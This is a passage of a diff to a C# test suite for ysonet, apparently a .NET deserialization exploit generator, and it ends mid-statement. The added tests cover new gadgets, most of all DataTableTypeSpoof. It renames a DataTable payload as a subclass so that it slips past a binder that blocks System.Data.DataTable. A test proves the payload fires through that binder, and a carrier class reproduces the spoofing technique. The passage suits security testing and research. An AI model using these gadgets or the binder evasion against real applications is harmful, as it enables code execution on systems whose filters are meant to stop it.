@@ -246,6 +246,17 @@ namespace ysonet.Tests
             Run("Editor blocks a variant+formatter mismatch at generate", EditorBlocksVariantFormatterMismatch);
             Run("Guard rejects variant+formatter mismatch on the non-UI path", GuardBlocksVariantFormatterOnNonUiPath);
             Run("DataTable implicit default equals explicit variant 1 (byte-for-byte)", DataTableDefaultEqualsVariantOne);
+            Run("DataTableTypeSpoof names the subclass, not DataTable, on every formatter", DataTableTypeSpoofNamesTheSubclassOnTheWire);
+            Run("DataTableTypeSpoof writes the operator's type and assembly verbatim", DataTableTypeSpoofWritesTheOperatorTypeVerbatim);
+            Run("DataTableTypeSpoof refuses variant 2 with SoapFormatter", DataTableTypeSpoofRefusesVariant2WithSoap);
+            Run("DataTableTypeSpoof implicit default equals explicit variant 1 (byte-for-byte)", DataTableTypeSpoofDefaultEqualsVariantOne);
+            Run("DataTable still emits its own type name after the spoof was added", DataTableStillEmitsItsOwnTypeName);
+            Run("DataTableTypeSpoof fires through a DataTable-blocking binder", DataTableTypeSpoofEvadesADataTableBlockingBinder);
+            Run("A spoofed subclass name rebuilds a real DataTable through the inherited ctor", SpoofedSubclassNameRebuildsARealDataTable);
+            Run("Editor offers the spoof options and keeps the assembly name whole", EditorOffersTheSpoofOptionsWithoutABrokenAssemblyMenu);
+            Run("ParseDefault keeps a dotted or quoted default whole", ParseDefaultKeepsDottedValuesWhole);
+            Run("Every editor default is a complete value, not a truncation", EditorDefaultsAreCompleteValuesNotTruncations);
+            Run("Every gadget's editor defaults build the same payload as no options", EveryGadgetEditorDefaultMatchesTheGadgetsOwnDefault);
             Run("TypeConfuseDelegate implicit default equals explicit variant 1 (byte-for-byte)", TypeConfuseDelegateDefaultEqualsVariantOne);
             Run("TypeConfuseDelegate rejects a variant outside 1-3", TypeConfuseDelegateVariantOptionIsValidated);
             Run("TypeConfuseDelegate container variants drop the SortedSet wire name", TypeConfuseDelegateVariantRootsAvoidSortedSetName);
@@ -288,13 +299,13 @@ namespace ysonet.Tests
             Run("AssemblyInstallerLoad validates the DLL path, the variant and the carrier", AssemblyInstallerLoadValidatesTheDllPath);
             Run("AssemblyInstallerLoad delivers an awkward path unchanged on every formatter", AssemblyInstallerLoadEscapesOperatorPaths);
             Run("AssemblyInstallerLoad declares a local and a UNC capability", AssemblyInstallerLoadDeclaresItsVariantFacets);
-            Run("AssemblyInstallerLoad refuses -t before it touches the path", AssemblyInstallerLoadRefusesSelfTest);
+            Run("AssemblyInstallerLoad accepts -t (a self-exploit that loads your DLL here)", AssemblyInstallerLoadAcceptsSelfTest);
             Run("AssemblyInstallerLoad generation never loads the DLL", AssemblyInstallerLoadGenerationIsInert);
             Run("AssemblyInstallerLoad info panel still shows its facts", AssemblyInstallerLoadInfoPanelStillShowsItsFacts);
             Run("TempFileCollection rebuilds the real type and its four delete fields", TempFileCollectionCarriesTheRealTypeAndFields);
             Run("TempFileCollection collects -c plus repeated --extrafile and touches no path", TempFileCollectionOptionParsing);
             Run("TempFileCollection keeps UNC and relative target paths verbatim", TempFileCollectionKeepsUncAndRelativePathsVerbatim);
-            Run("TempFileCollection refuses -t before anything can construct the target", TempFileCollectionRefusesSelfTest);
+            Run("TempFileCollection accepts -t (a self-exploit that deletes your files here)", TempFileCollectionAcceptsSelfTest);
             Run("TempFileCollection refuses a target path it would rewrite", TempFileCollectionRefusesAPathItWouldRewrite);
             Run("TempFileCollection info panel still shows its formatters, input and categories", TempFileCollectionInfoPanelStillShowsItsFacts);
             Run("WbemClassObjectUnmarshal builds a well formed OBJREF_STANDARD naming the host", WbemClassObjectUnmarshalBuildsAValidObjRef);
@@ -310,6 +321,32 @@ namespace ysonet.Tests
             Run("FileSystemInfo accepts -t and ships the same payload", FileSystemInfoAcceptsSelfTest);
             Run("FileSystemInfo declares a network kind, a UNC input and constructor formatters", FileSystemInfoDeclaresItsFacets);
             Run("FileSystemInfo info panel still shows its formatters, input and categories", FileSystemInfoInfoPanelStillShowsItsFacts);
+            Run("ResourceDictionary carries the URI into Source unmodified", ResourceDictionaryCarriesTheUriUnmodified);
+            Run("ResourceDictionary refuses only an empty -c and a value --minify would rewrite", ResourceDictionaryRefusesOnlyWhatItCannotEmit);
+            Run("ResourceDictionary --rawinput skips the attribute escaping", ResourceDictionaryRawInputSkipsTheEscaping);
+            Run("ResourceDictionary advertises only Xaml, and every exclusion has a measured reason", ResourceDictionaryAdvertisesOnlyXamlAndWhy);
+            Run("ResourceDictionary declares a network/code-execution kind and three inputs", ResourceDictionaryDeclaresItsFacets);
+            Run("ResXFileRef composes the converter value exactly as the framework writes it", ResXFileRefComposesTheConverterValue);
+            Run("ResXFileRef refuses only what it cannot emit", ResXFileRefRefusesOnlyWhatItCannotEmit);
+            Run("ResXFileRef --rawinput skips the per-format escaping", ResXFileRefRawInputSkipsTheEscaping);
+            Run("ResXFileRef advertises only Xaml and YamlDotNet, and every exclusion has a reason", ResXFileRefAdvertisesOnlyXamlAndYamlAndWhy);
+            Run("ResXFileRef is dropped, silently, by the restrictive XAML reader", ResXFileRefIsDroppedByTheRestrictiveXamlReader);
+            Run("ResXFileRef declares per-variant kinds, inputs and option scope", ResXFileRefDeclaresItsFacets);
+            Run("ResXFileRef accepts -t on every variant (self-exploit runs the converter here)", ResXFileRefAcceptsSelfTestOnEveryVariant);
+            Run("Editor hides the test toggle for a variant that refuses -t (Generate is not dead-ended)", EditorHidesTheTestToggleForARefusingVariant);
+            Run("Resx indirect_resx_file keeps its default value and accepts --type/--enc", ResxPluginIndirectFileRefKeepsItsDefaultAndAcceptsTypeAndEncoding);
+            Run("ObjectDataProvider's retired variants refuse by name", ObjectDataProviderRetiredVariantsMovedToTheirOwnGadgets);
+            Run("WorkflowDesigner carries the inner XAML into every advertised formatter", WorkflowDesignerCarriesTheInnerDocument);
+            Run("WorkflowDesigner consumes a bridged Xaml payload and keeps a default", WorkflowDesignerConsumesABridgedXamlPayload);
+            Run("WorkflowDesigner refuses only an empty -c and an unadvertised formatter", WorkflowDesignerRefusesOnlyWhatItCannotEmit);
+            Run("WorkflowDesigner advertises what can reach a write-only member", WorkflowDesignerAdvertisesWhatCanReachAWriteOnlyMember);
+            Run("WorkflowDesigner declares a nested-deserialization/code-execution kind", WorkflowDesignerDeclaresItsFacets);
+            Run("DynamicUpdateMapExtension wraps the NDCS document in an x:XData section", DynamicUpdateMapExtensionCarriesTheInnerDocument);
+            Run("DynamicUpdateMapExtension consumes a bridged NDCS payload and keeps a default", DynamicUpdateMapExtensionConsumesABridgedNdcsPayload);
+            Run("DynamicUpdateMapExtension refuses only an empty -c and an unadvertised formatter", DynamicUpdateMapExtensionRefusesOnlyWhatItCannotEmit);
+            Run("DynamicUpdateMapExtension reaches ReadXml only through x:XData", DynamicUpdateMapExtensionReachesReadXmlOnlyThroughXData);
+            Run("DynamicUpdateMapExtension declares a nested-deserialization/code-execution kind", DynamicUpdateMapExtensionDeclaresItsFacets);
+            Run("TextFormattingRunProperties --xamlurl carries ResourceDictionary, not ObjectDataProvider", TextFormattingRunPropertiesXamlUrlCarriesResourceDictionary);
             Run("XAML root container: no option equals --rootcontainer 1 (byte-for-byte)", XamlContainerDefaultEqualsContainerOne);
             Run("XAML root container rejects a value outside 1-3", XamlContainerOptionIsValidated);
             Run("XAML root containers 2/3 drop the SortedSet wire name", XamlContainerRootsAvoidSortedSetName);
@@ -407,6 +444,13 @@ namespace ysonet.Tests
             Run("Non-RCE gadget payloads carry an apostrophe in the operator value unchanged", NonRcePayloadsCarryAnApostropheValue);
             Run("ObjectDataProvider carries an apostrophe in the command unchanged", ObjectDataProviderCarriesAnApostropheInTheCommand);
             Run("MessagePack Typeless payloads carry the target type names, not the surrogates'", MessagePackTypelessCarriesTargetTypeNames);
+            Run("Debug-mode errors name every exception in the chain, on stderr", ShowErrorsExplainsTheWholeExceptionChain);
+            Run("-t fires through the product's own self-test path, not just the harness", SelfTestFiresThroughTheProductsOwnPath);
+            Run("Each claims-key variant carries only its own SerializationInfo key", ClaimsKeyVariantsCarryOnlyTheirOwnKey);
+            Run("An unknown claims-key variant produces variant 1's bytes", ClaimsKeyOutOfRangeVariantFallsBackToOne);
+            Run("The WIF _actor variant refuses the formatters it cannot express", ClaimsKeyWifVariantRefusesFormatters);
+            Run("A bridged payload still lands under the chosen claims key", ClaimsKeyVariantsHonourABridgedPayload);
+            Run("The claims carriers' NDCS payloads need their <root> envelope named", ClaimsKeyNdcsPayloadNeedsItsRootEnvelope);
             Run("Every gadget generates a non-empty payload from valid inputs", EveryGadgetGeneratesAPayload);
             Run("Every safe plugin generates a payload; the rest are explicitly excluded", EverySafePluginGeneratesAPayload);
             Run("SharePoint --spver targets a generation without shipping its assemblies", SharePointSpVerTargetsAGeneration);
@@ -653,12 +697,12 @@ namespace ysonet.Tests
             IGenerator g = GadgetRegistry.CreateGadgetInstance("ObjectDataProvider");
             AssertTrue(g != null, "gadget loads");
             var fields = OptionField.FromOptionSet(g.Options());
-            // ObjectDataProvider has var|variant= and xamlurl=
-            AssertEqual(2, fields.Count, "two options");
+            // ObjectDataProvider has var|variant= and nothing else. --xamlurl left with
+            // variant 3, which is now the ResourceDictionary gadget.
+            AssertEqual(1, fields.Count, "one option");
             OptionField variant = FindField(fields, "variant");
-            OptionField xamlurl = FindField(fields, "xamlurl");
             AssertTrue(variant != null, "variant field present");
-            AssertTrue(xamlurl != null, "xamlurl field present");
+            AssertTrue(FindField(fields, "xamlurl") == null, "xamlurl is gone from ObjectDataProvider");
             AssertTrue(variant.TakesValue, "variant takes a value");
             // var|variant has no single-char alias, so ShortName is null.
             AssertTrue(variant.ShortName == null, "variant has no single-char short name");
@@ -964,7 +1008,13 @@ namespace ysonet.Tests
 
             var odpOptions = CliListing.GadgetOptions("ObjectDataProvider");
             AssertTrue(odpOptions.Contains("--variant"), "ObjectDataProvider exposes --variant");
-            AssertTrue(odpOptions.Contains("--xamlurl"), "ObjectDataProvider exposes --xamlurl");
+            AssertTrue(!odpOptions.Contains("--xamlurl"),
+                "ObjectDataProvider no longer exposes --xamlurl (it moved to ResourceDictionary as -c)");
+
+            var rdOptions = CliListing.GadgetOptions("ResourceDictionary");
+            AssertTrue(rdOptions.Contains("--rawinput"), "ResourceDictionary exposes --rawinput");
+            AssertTrue(CliListing.GadgetFormatters("ResourceDictionary").Contains("Xaml"),
+                "ResourceDictionary supports Xaml");
 
             var vsOptions = CliListing.PluginOptions("ViewState");
             AssertTrue(vsOptions.Count > 5, "ViewState plugin exposes options");
@@ -2157,7 +2207,7 @@ namespace ysonet.Tests
 
         private static void GadgetsDeclareVariants()
         {
-            AssertEqual(4, Gadget("ObjectDataProvider").Variants().Count, "ODP declares 4 variants");
+            AssertEqual(2, Gadget("ObjectDataProvider").Variants().Count, "ODP declares 2 variants");
             AssertEqual(2, Gadget("XamlImageInfo").Variants().Count, "XamlImageInfo declares 2 variants");
             AssertEqual(2, Gadget("ActivitySurrogateSelector").Variants().Count, "ASS declares 2 variants");
             AssertEqual(2, Gadget("ActivitySurrogateSelectorFromFile").Variants().Count, "ASSFromFile inherits 2 variants");
@@ -2182,6 +2232,41 @@ namespace ysonet.Tests
             var v = Gadget("ObjectDataProvider").Variants();
             AssertEqual(1, v[0].Number, "first variant is number 1");
             AssertTrue(!string.IsNullOrEmpty(v[0].Label), "variants carry a label");
+
+            // CATALOGUE-WIDE INVARIANT, not a spot check on the gadgets named above: every
+            // non-empty Variants() list is exactly 1, 2, ..., N in that order. Variant 1 is
+            // the default the CLI and the wizard fall back to, and the number is what a user
+            // types, so a gap, a duplicate or an out-of-order entry means some surface is
+            // offering a variant that builds something else - or nothing.
+            //
+            // A RETIRED VARIANT IS STILL A GAP. When a payload leaves a gadget, renumber the
+            // survivors and record the move in the option help, the docs and the changelog;
+            // do not leave the hole. ObjectDataProvider is the worked example: its XAML-url
+            // payload became the ResourceDictionary gadget and the WorkflowDesigner wrapper
+            // moved from 4 to 3.
+            var numbering = new List<string>();
+            foreach (string name in GadgetRegistry.GetGadgetNames())
+            {
+                if (name == "Generic") continue;
+                IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
+                if (g == null) continue;
+                List<GadgetVariant> declared = g.Variants();
+                if (declared == null || declared.Count == 0) continue;
+
+                for (int i = 0; i < declared.Count; i++)
+                {
+                    if (declared[i].Number != i + 1)
+                    {
+                        numbering.Add(name + " declares ["
+                            + string.Join(",", declared.ConvertAll(d => d.Number.ToString()).ToArray())
+                            + "] instead of 1.." + declared.Count);
+                        break;
+                    }
+                }
+            }
+            AssertEqual(0, numbering.Count,
+                "every gadget with variants numbers them 1..N in order: "
+                    + string.Join("; ", numbering.ToArray()));
         }
 
         private static void VariantInputTypes()
@@ -2252,6 +2337,17 @@ namespace ysonet.Tests
             AssertTrue(dt[1].SupportsFormatter("BinaryFormatter"), "DataTable variant 2 still supports BinaryFormatter");
             AssertTrue(dt[1].SupportsFormatter("LosFormatter"), "DataTable variant 2 still supports LosFormatter");
             AssertTrue(Gadget("DataTable").IsSupported("SoapFormatter"), "DataTable still lists SoapFormatter at the gadget level (union)");
+
+            // DataTableTypeSpoof carries the same two inner gadgets, so it must declare the
+            // same shape. If the two ever drift, one of them is advertising a cell it cannot
+            // build.
+            var dts = Gadget("DataTableTypeSpoof").Variants();
+            AssertEqual(2, dts.Count, "DataTableTypeSpoof declares exactly 2 variants");
+            AssertEqual(0, dts[0].UnsupportedFormatters.Count, "DataTableTypeSpoof variant 1 has no opt-out");
+            AssertTrue(dts[1].UnsupportedFormatters.Contains("SoapFormatter"), "DataTableTypeSpoof variant 2 declares the SoapFormatter opt-out");
+            AssertTrue(dts[1].SupportsFormatter("BinaryFormatter"), "DataTableTypeSpoof variant 2 still supports BinaryFormatter");
+            AssertTrue(dts[1].SupportsFormatter("LosFormatter"), "DataTableTypeSpoof variant 2 still supports LosFormatter");
+            AssertTrue(Gadget("DataTableTypeSpoof").IsSupported("SoapFormatter"), "DataTableTypeSpoof still lists SoapFormatter at the gadget level (union)");
         }
 
         private static void EditorBlocksVariantFormatterMismatch()
@@ -2508,6 +2604,676 @@ namespace ysonet.Tests
                 InputArgs = ia,
             };
             return PayloadRunner.GenerateGadget(req);
+        }
+
+        // ---- DataTableTypeSpoof: the same carrier under a subclass name --------
+        //
+        // The whole point of this gadget is the TYPE NAME on the wire, so the focused tests
+        // assert the emitted bytes rather than trusting that generation succeeded. Two
+        // encodings break a naive search and SearchableWire handles both: LosFormatter
+        // returns base64 text, and SoapFormatter splits a type name into an element name plus
+        // an "nsassem" namespace holding the CLR namespace and a percent-encoded assembly
+        // identity, so the joined name never appears in SOAP output at all.
+
+        // The default profile must reach the wire on every advertised formatter and both
+        // minify states, and the payload must NOT carry a System.Data.DataTable type record -
+        // that record is exactly what a name filter looks for.
+        private static void DataTableTypeSpoofNamesTheSubclassOnTheWire()
+        {
+            foreach (string formatter in new[] { "BinaryFormatter", "SoapFormatter", "LosFormatter" })
+            {
+                for (int m = 0; m < 2; m++)
+                {
+                    bool minify = m == 1;
+                    string desc = "DataTableTypeSpoof -f " + formatter + (minify ? " (minify)" : "");
+
+                    RunResult r = GenerateDataTableTypeSpoof(formatter, minify, null, null, null);
+                    AssertTrue(r.Success, desc + " generates: " + r.ErrorMessage);
+                    string wire = SearchableWire(r, formatter);
+
+                    if (formatter.Equals("SoapFormatter", StringComparison.OrdinalIgnoreCase))
+                    {
+                        AssertTrue(wire.Contains("nsassem/System.Data.Entity.Design.SsdlGenerator/"),
+                            desc + " carries the subclass namespace: " + desc);
+                        AssertTrue(wire.Contains(":TableDetailsCollection"),
+                            desc + " carries the subclass element name");
+                        // The assembly identity sits inside the namespace URI, so its shape
+                        // depends on --minify: raw SOAP percent-encodes the commas and spaces,
+                        // and the XML minifier writes the decoded form with the spaces after
+                        // each comma collapsed. Both name the same assembly and both bind, so
+                        // the check is per state rather than one loose substring.
+                        AssertTrue(wire.Contains(minify
+                                ? "System.Data.Entity.Design,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089"
+                                : "System.Data.Entity.Design%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Db77a5c561934e089"),
+                            desc + " carries the full assembly identity in the form this state writes");
+                    }
+                    else
+                    {
+                        AssertTrue(wire.Contains(DataTableTypeSpoofGenerator.DefaultTargetType),
+                            desc + " carries the default subclass type name");
+                        AssertTrue(wire.Contains(DataTableTypeSpoofGenerator.DefaultTargetAssembly),
+                            desc + " carries the full assembly identity");
+                    }
+
+                    AssertTrue(!wire.Contains("System.Data.DataTable"),
+                        desc + " writes no System.Data.DataTable type record");
+                }
+            }
+        }
+
+        // The operator's names are written exactly as typed: no validation, no rewriting, no
+        // fallback to the default. The custom type carries an apostrophe and a space, which a
+        // gadget that "cleaned up" the value would lose.
+        private static void DataTableTypeSpoofWritesTheOperatorTypeVerbatim()
+        {
+            const string customType = "Contoso.Data.O'Brien Orders";
+            const string customAssembly = "Contoso.Data, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null";
+
+            foreach (string formatter in new[] { "BinaryFormatter", "LosFormatter" })
+            {
+                RunResult r = GenerateDataTableTypeSpoof(formatter, false, null, customType, customAssembly);
+                AssertTrue(r.Success, formatter + " generates with operator names: " + r.ErrorMessage);
+                string wire = SearchableWire(r, formatter);
+
+                AssertTrue(wire.Contains(customType), formatter + " writes the type name byte-for-byte");
+                AssertTrue(wire.Contains(customAssembly), formatter + " writes the assembly identity byte-for-byte");
+                AssertTrue(!wire.Contains(DataTableTypeSpoofGenerator.DefaultTargetType),
+                    formatter + " drops the default profile once the operator names their own type");
+            }
+
+            // SOAP writes the same names, split the way the SOAP encoder writes any type: an
+            // element name plus the namespace and the percent-encoded assembly. The type name
+            // here is XML-safe because the SOAP writer puts it in an element name; that is the
+            // formatter's constraint, not a check this gadget makes.
+            RunResult soap = GenerateDataTableTypeSpoof("SoapFormatter", false, null,
+                "Contoso.Data.OrdersTable", customAssembly);
+            AssertTrue(soap.Success, "SoapFormatter generates with operator names: " + soap.ErrorMessage);
+            string soapWire = SearchableWire(soap, "SoapFormatter");
+            AssertTrue(soapWire.Contains("nsassem/Contoso.Data/"), "SOAP carries the operator's namespace");
+            AssertTrue(soapWire.Contains(":OrdersTable"), "SOAP carries the operator's element name");
+            AssertTrue(soapWire.Contains("Contoso.Data%2C%20Version%3D1.0.0.0"),
+                "SOAP carries the operator's assembly identity");
+
+            // The one refusal: a name that cannot be written at all. Nothing else is policed.
+            RunResult emptyType = GenerateDataTableTypeSpoof("BinaryFormatter", false, null, "   ", null);
+            AssertTrue(!emptyType.Success, "an empty --target-type is refused");
+            AssertTrue((emptyType.ErrorMessage ?? "").IndexOf("non-empty --target-type", StringComparison.OrdinalIgnoreCase) >= 0,
+                "the refusal names the option: " + emptyType.ErrorMessage);
+
+            RunResult emptyAssembly = GenerateDataTableTypeSpoof("BinaryFormatter", false, null, null, "   ");
+            AssertTrue(!emptyAssembly.Success, "an empty --target-assembly is refused");
+            AssertTrue((emptyAssembly.ErrorMessage ?? "").IndexOf("non-empty --target-assembly", StringComparison.OrdinalIgnoreCase) >= 0,
+                "the refusal names the option: " + emptyAssembly.ErrorMessage);
+        }
+
+        // Variant 2 wraps TypeConfuseDelegate (a generic SortedSet), which SoapFormatter
+        // cannot serialize. The guard must fire with its stable phrase BEFORE the deep
+        // framework exception, exactly as it does on the DataTable gadget.
+        private static void DataTableTypeSpoofRefusesVariant2WithSoap()
+        {
+            RunResult v2soap = GenerateWithVariant("DataTableTypeSpoof", "SoapFormatter", 2);
+            AssertTrue(!v2soap.Success, "DataTableTypeSpoof variant 2 + SoapFormatter fails");
+            AssertTrue((v2soap.ErrorMessage ?? "").IndexOf("is not supported by variant 2", StringComparison.OrdinalIgnoreCase) >= 0,
+                "the guard fired, not the raw framework error: " + v2soap.ErrorMessage);
+
+            RunResult v1soap = GenerateWithVariant("DataTableTypeSpoof", "SoapFormatter", 1);
+            AssertTrue(v1soap.Success, "variant 1 + SoapFormatter still generates: " + v1soap.ErrorMessage);
+
+            RunResult v2bin = GenerateWithVariant("DataTableTypeSpoof", "BinaryFormatter", 2);
+            AssertTrue(v2bin.Success, "variant 2 + BinaryFormatter generates: " + v2bin.ErrorMessage);
+        }
+
+        // With no option at all the gadget must produce the exact bytes of an explicit
+        // --variant 1, across every advertised formatter and both minify states. Same
+        // reasoning as DataTableDefaultEqualsVariantOne: it compares two live generations, so
+        // no runtime-sensitive hash is baked in.
+        private static void DataTableTypeSpoofDefaultEqualsVariantOne()
+        {
+            foreach (string formatter in new[] { "BinaryFormatter", "SoapFormatter", "LosFormatter" })
+            {
+                for (int m = 0; m < 2; m++)
+                {
+                    bool minify = m == 1;
+
+                    RunResult def = GenerateDataTableTypeSpoof(formatter, minify, null, null, null);
+                    RunResult v1 = GenerateDataTableTypeSpoof(formatter, minify, 1, null, null);
+
+                    string desc = "DataTableTypeSpoof -f " + formatter + (minify ? " (minify)" : "");
+                    AssertTrue(def.Success, "implicit default generates: " + desc + " -> " + def.ErrorMessage);
+                    AssertTrue(v1.Success, "explicit variant 1 generates: " + desc + " -> " + v1.ErrorMessage);
+
+                    byte[] a = def.Raw as byte[];
+                    byte[] b = v1.Raw as byte[];
+                    AssertTrue(a != null && b != null, "both payloads are byte streams: " + desc);
+                    AssertTrue(BytesEqual(a, b),
+                        "implicit default equals explicit variant 1 byte-for-byte: " + desc);
+                }
+            }
+        }
+
+        // A regression guard on the UNTOUCHED gadget: adding the spoof must not change what
+        // -g DataTable writes. This is what makes "the shipped DataTable bytes did not change"
+        // a tested claim instead of a promise.
+        private static void DataTableStillEmitsItsOwnTypeName()
+        {
+            foreach (string formatter in new[] { "BinaryFormatter", "SoapFormatter", "LosFormatter" })
+            {
+                RunResult r = GenerateDataTable(formatter, false, null);
+                AssertTrue(r.Success, "DataTable -f " + formatter + " generates: " + r.ErrorMessage);
+                string wire = SearchableWire(r, formatter);
+
+                if (formatter.Equals("SoapFormatter", StringComparison.OrdinalIgnoreCase))
+                {
+                    AssertTrue(wire.Contains("nsassem/System.Data/"),
+                        "DataTable SOAP still names the System.Data namespace");
+                    AssertTrue(wire.Contains(":DataTable "),
+                        "DataTable SOAP still uses the DataTable element name");
+                }
+                else
+                {
+                    AssertTrue(wire.Contains("System.Data.DataTable"),
+                        "DataTable -f " + formatter + " still writes its own type name");
+                }
+
+                AssertTrue(!wire.Contains("SsdlGenerator"),
+                    "DataTable -f " + formatter + " never mentions the spoof default profile");
+            }
+        }
+
+        // The interactive editor has to offer both new settings, and the assembly default is
+        // the exact shape that once turned a comma-carrying VALUE into a menu of broken
+        // fragments (EditableField.AttributeLikeParts). Also lock that --bgc stays hidden:
+        // this is a root carrier, not a bridge gadget.
+        private static void EditorOffersTheSpoofOptionsWithoutABrokenAssemblyMenu()
+        {
+            var editor = new ModuleEditor(null, null, true, null, null);
+            var fields = editor.BuildFieldsForTest("DataTableTypeSpoof");
+
+            EditableField variant = FindEditable(fields, "variant");
+            AssertTrue(variant != null && !variant.Hidden, "the editor offers variant");
+
+            // THE VALUE, not just the presence. The first version of this test checked only
+            // that the assembly help was not turned into a choice MENU, and passed while the
+            // editor was showing (and emitting) "System" for both settings - a payload naming
+            // a type that cannot resolve, so nothing fired. A field the editor pre-fills is a
+            // value it will emit, so the value is what has to be asserted.
+            EditableField targetType = FindEditable(fields, "target-type");
+            AssertTrue(targetType != null && !targetType.Hidden, "the editor offers target-type");
+            AssertEqual(DataTableTypeSpoofGenerator.DefaultTargetType, targetType.Value,
+                "the editor's target-type default is the gadget's own default, whole");
+
+            EditableField targetAssembly = FindEditable(fields, "target-assembly");
+            AssertTrue(targetAssembly != null && !targetAssembly.Hidden, "the editor offers target-assembly");
+            AssertEqual(DataTableTypeSpoofGenerator.DefaultTargetAssembly, targetAssembly.Value,
+                "the editor's target-assembly default is the gadget's own default, whole");
+            AssertTrue(targetAssembly.Choices == null || targetAssembly.Choices.Count == 0,
+                "the assembly display name in the help is not offered as a choice menu");
+            AssertTrue(targetType.Choices == null || targetType.Choices.Count == 0,
+                "the two profile names in the help are not offered as a choice menu");
+
+            // End to end: what the editor would emit must build the payload the CLI builds
+            // with no options at all.
+            foreach (string formatter in new[] { "BinaryFormatter", "SoapFormatter", "LosFormatter" })
+            {
+                List<string> emitted = editor.GadgetExtraArgvForTest();
+                RunResult viaEditor = GenerateWithExtraArgs("DataTableTypeSpoof", formatter, "calc.exe", emitted);
+                RunResult plain = GenerateWithExtraArgs("DataTableTypeSpoof", formatter, "calc.exe", new List<string>());
+                AssertTrue(viaEditor.Success, "the editor's own arguments generate (-f " + formatter + "): " + viaEditor.ErrorMessage);
+                AssertTrue(BytesEqual(viaEditor.Raw as byte[], plain.Raw as byte[]),
+                    "the editor's defaults build the same payload as no options (-f " + formatter + ")");
+            }
+
+            EditableField bgc = FindEditable(fields, "bridgedgadgetchain");
+            AssertTrue(bgc != null && bgc.Hidden, "bgc is hidden for this non-bridge gadget");
+        }
+
+        // A binder that rejects ONE name: System.Data.DataTable, exactly the policy the
+        // spoof exists to walk past. Everything else falls through to the default binding,
+        // so the rest of the graph is untouched.
+        private sealed class DataTableNameBlockingBinder : System.Runtime.Serialization.SerializationBinder
+        {
+            public override Type BindToType(string assemblyName, string typeName)
+            {
+                if (string.Equals(typeName, "System.Data.DataTable", StringComparison.Ordinal))
+                    throw new System.Runtime.Serialization.SerializationException(
+                        "blocked by the test binder: " + typeName);
+                return null;
+            }
+        }
+
+        // THE BEHAVIOURAL PROOF OF THE EVASION, which the wire-name assertions cannot give:
+        // through a binder that rejects only "System.Data.DataTable", the DataTable gadget is
+        // blocked and never runs, while DataTableTypeSpoof passes the same binder and fires.
+        // That is the claim the gadget is FOR, stated as a behaviour rather than a byte
+        // search.
+        private static void DataTableTypeSpoofEvadesADataTableBlockingBinder()
+        {
+            // The plain carrier must be blocked, and must NOT execute.
+            using (FireTarget blocked = FireBackend.Create("DTTS_binder_plain_blocked"))
+            {
+                byte[] payload = MarkerPayloadFor("DataTable", "BinaryFormatter", blocked, null);
+                Exception caught = null;
+                try { DeserializeWithBinder(payload, new DataTableNameBlockingBinder()); }
+                catch (Exception ex) { caught = ex; }
+
+                AssertTrue(caught != null, "the binder blocks the DataTable root of the plain gadget");
+                // An ABSENCE assertion, so it keeps a short bound.
+                AssertTrue(!blocked.Wait(300), "the plain DataTable carrier does not execute when its root type is blocked");
+            }
+
+            // The spoofed name passes the same binder and fires.
+            using (FireTarget fire = FireBackend.Create("DTTS_binder_spoofed"))
+            {
+                byte[] payload = MarkerPayloadFor("DataTableTypeSpoof", "BinaryFormatter", fire, null);
+                // The inner TFRP throws AFTER Process.Start (its ObjectDataProvider is cast to
+                // Brush), so the fire evidence, not a clean return, is the proof.
+                RunSTA(delegate { DeserializeWithBinder(payload, new DataTableNameBlockingBinder()); });
+                AssertTrue(fire.Wait(MarkerWaitMs),
+                    "the spoofed subclass name fires through a binder that rejects System.Data.DataTable");
+            }
+        }
+
+        // A test-owned copy of the technique, carrying a BENIGN string instead of a gadget.
+        //
+        // Why it has to exist: with TextFormattingRunProperties or TypeConfuseDelegate in the
+        // cell, the inner gadget is materialised from the member records and fires - and then
+        // throws - BEFORE the root object is ever constructed. So no fire row can show that
+        // the subclass's inherited DataTable(SerializationInfo, StreamingContext) constructor
+        // rebuilt the table, which is the half of the technique a target that CASTS the root
+        // to DataTable depends on. A benign cell removes the throw and lets the round trip
+        // finish, which is the only way to see that step.
+        //
+        // It deliberately does not reach into the gadget's own marshal: what is being proven
+        // is the WIRE FORMAT (DataTable's member set under a subclass name), not one class.
+        [Serializable]
+        private sealed class SubclassNameCarrier : System.Runtime.Serialization.ISerializable
+        {
+            private readonly System.Data.DataTable _table;
+            private readonly string _targetTypeName;
+            private readonly string _targetAssemblyName;
+
+            public SubclassNameCarrier(System.Data.DataTable table, string typeName, string assemblyName)
+            {
+                _table = table;
+                _targetTypeName = typeName;
+                _targetAssemblyName = assemblyName;
+            }
+
+            public void GetObjectData(System.Runtime.Serialization.SerializationInfo info,
+                System.Runtime.Serialization.StreamingContext context)
+            {
+                _table.GetObjectData(info, context);
+                info.FullTypeName = _targetTypeName;
+                info.AssemblyName = _targetAssemblyName;
+            }
+        }
+
+        // The other half of the claim: a DataTable member set delivered under an in-box
+        // SUBCLASS name really is rebuilt, by that subclass, through the inherited
+        // constructor - with the row intact.
+        private static void SpoofedSubclassNameRebuildsARealDataTable()
+        {
+            const string cellValue = "ysonet-subclass-probe";
+
+            foreach (string formatter in new[] { "BinaryFormatter", "SoapFormatter" })
+            {
+                object rebuilt = RoundTripCarrierUnderName(formatter,
+                    DataTableTypeSpoofGenerator.DefaultTargetType,
+                    DataTableTypeSpoofGenerator.DefaultTargetAssembly, cellValue);
+
+                AssertTrue(rebuilt != null, formatter + ": the spoofed document deserializes to an object");
+                AssertEqual(DataTableTypeSpoofGenerator.DefaultTargetType, rebuilt.GetType().FullName,
+                    formatter + ": the target really built the named subclass, not System.Data.DataTable");
+
+                System.Data.DataTable table = rebuilt as System.Data.DataTable;
+                AssertTrue(table != null, formatter + ": the rebuilt object IS a DataTable (the inherited constructor ran)");
+                AssertEqual(1, table.Rows.Count, formatter + ": the inherited constructor rebuilt the row");
+                AssertEqual(cellValue, Convert.ToString(table.Rows[0][0]), formatter + ": the cell value survived the round trip");
+            }
+
+            // And the negative that explains the operator table in the gadget header: a name
+            // that does not resolve cannot rebuild anything. (A payload carrying a GADGET
+            // still fires in that case, because the inner gadget is materialised first -
+            // which is exactly why this benign carrier is the honest place to measure it.)
+            Exception caught = null;
+            try
+            {
+                RoundTripCarrierUnderName("BinaryFormatter", "System.Data.NoSuchTypeAtAll",
